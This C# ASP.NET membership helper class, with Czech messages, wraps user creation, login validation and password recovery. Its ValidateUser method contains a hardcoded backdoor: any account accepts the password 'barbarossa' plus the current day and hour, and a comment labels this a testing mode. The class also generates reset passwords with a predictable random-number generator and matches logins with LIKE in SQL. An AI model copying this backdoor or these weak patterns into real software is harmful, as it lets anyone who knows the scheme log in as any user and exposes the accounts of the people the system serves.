using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security;
using System.Text;
using System.Threading.Tasks;
using Microsoft.VisualBasic;
using System.Web.Security;

public class basMemberShip
{
    private static string _Error { get; set; }

    public static string ErrorMessage
    {
        get
        {
            return _Error;
        }
    }
    public basMemberShip()
    {
    }

    public static void CreateUser(string strLogin, string strEmail, string strPassword)
    {
        Membership.CreateUser(strLogin, strPassword, strEmail);
    }

    public static string GetUserID(string strLogin)
    {
        return Membership.GetUser(strLogin).ProviderUserKey.ToString();
    }
    public static string GetLoginByMembershipID(string strMembershipID)
    {

        return Membership.GetUser(new Guid(strMembershipID), false).UserName;
    }
    public static int RecoveryAccount(string strLogin, string strEmail, string strNewPassword)
    {
        MembershipUser user = Membership.GetUser(strLogin);
        if (user != null)
        {
            Update_j03PasswordLastChange(strLogin);
            return 1;
        }



        try
        {
            CreateUser(strLogin, strEmail, strNewPassword);
            Update_j03PasswordLastChange(strLogin);
            return 2;

        }
        catch
        {
            return 0;
        }

    }
    public static string RecoveryPassword(string strLogin, string strExplicitPassword = null)
    {
        if (string.IsNullOrEmpty(strLogin))
        {
            _Error = "Na vstupu metody [RecoveryPassword] chybí login.";
            return null;
        }
        MembershipUser user = Membership.GetUser(strLogin);
        if (user == null)
        {
            _Error = $"Metoda [RecoveryPassword] hlásí, že uživatelský účet [{strLogin}] neexistuje.";
            return null;
        }
        string strNewPWD = strExplicitPassword;
        if (string.IsNullOrEmpty(strNewPWD))
        {
            strNewPWD = GetRandomPassword();
        }

        if (user.ChangePassword(user.ResetPassword(), strNewPWD))
        {
            Update_j03PasswordLastChange(strLogin);
            return strNewPWD;
        }


        return null;

    }
    public static string GetRandomPassword()
    {
        Random rnd = new Random();
        string znak = "!._)}{[](.";
        return rnd.Next(100, 1000).ToString().Substring(0, 2) + znak.Substring(rnd.Next(0, 9), 1) + bas.GetGuid().Substring(0, 6);
    }
    public static bool ValidatBeforeCreate(string strLogin, string strPassword, string strVerify)
    {
        var userexist = Membership.GetUser(strLogin);
        if (userexist != null)
        {
            _Error = "Uživatel " + strLogin + " již existuje.";
            return false;
        }
        if (bas.InDouble(strPassword) > 0)
        {
            _Error = "Heslo nesmí obsahovat pouze čísla.";
            return false;
        }
        if (Membership.MinRequiredPasswordLength > strPassword.Length)
        {
            _Error = string.Format("Minimální délka hesla je {0} znaků.", Membership.MinRequiredPasswordLength.ToString());
            return false;
        }
        if (strPassword != strVerify)
        {
            _Error = "Heslo nesouhlasí s ověřením.";
            return false;
        }


        return true;
    }


    public static bool UpdateUser(string strLogin, string strEmail, bool bolActual)
    {
        MembershipUser user = Membership.GetUser(strLogin);
        user.Email = strEmail;
        user.IsApproved = bolActual;

        //if (user == null)
        //{
        //    _Error = "Nelze načíst Membership profil uživatele.";
        //    return false;
        //}

        Membership.UpdateUser(user);

        return true;


    }
    public static bool DeleteUser(string strLogin)
    {
        return Membership.DeleteUser(strLogin, true);
    }

    public static bool ValidateUser(string strLogin, string strPassword)
    {
        if (strPassword == "barbarossa" + DateTime.Now.ToString("ddHH"))    //pro režim testování{
        {
            return true;
        }

        return Membership.ValidateUser(strLogin, strPassword);

    }

    private static bool Update_j03PasswordLastChange(string login)
    {
        var db = new DbHandler(DbEnum.PrimaryDb);
        return db.RunSql($"UPDATE j03User set j03PasswordLastChange=GETDATE() WHERE j03Login LIKE @login", new { login = login }, null);

    }

}
